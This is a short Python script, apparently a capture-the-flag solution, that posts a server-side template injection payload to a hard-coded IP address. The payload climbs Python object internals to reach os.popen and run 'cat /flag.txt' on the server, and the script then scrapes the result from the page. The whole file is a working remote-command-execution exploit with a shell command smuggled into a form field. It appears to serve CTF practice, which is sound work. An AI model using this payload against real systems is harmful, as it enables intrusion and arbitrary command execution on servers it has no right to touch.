import requests
from urllib.parse import urlencode
from bs4 import BeautifulSoup


# define SSTI payload
payload = urlencode({
        "name": "{{'foo'.__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen('cat /flag.txt').read()}}"
    })


# send request and get result
result = requests.request("POST", "http://193.57.159.27:47715/", data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded'})


# parse result for flag
html = BeautifulSoup(result.text, "html.parser")
flag = html.find_all("h1")[0].text
print(flag)